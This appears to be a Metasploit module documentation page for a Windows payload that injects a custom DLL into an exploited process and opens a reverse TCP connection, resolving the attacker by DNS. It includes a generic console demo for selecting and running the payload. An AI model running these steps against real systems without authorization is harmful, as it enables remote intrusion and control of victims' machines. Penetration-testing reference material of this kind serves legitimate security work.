## Windows Inject DLL, Reverse TCP Stager (DNS)

Inject a custom DLL into the exploited process. Connect back 
to the attacker


## Module Name
payload/windows/patchupdllinject/reverse_tcp_dns

## Authors
* jt <jt@klake.org>
* skape
* hdm
* sf





## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/patchupdllinject/reverse_tcp_dns
msf payload(reverse_tcp_dns) > show targets
   ... a list of targets ...
msf payload(reverse_tcp_dns) > set TARGET <target-id>
msf payload(reverse_tcp_dns) > show options
   ... show and set options ...
msf payload(reverse_tcp_dns) > run
```
    
    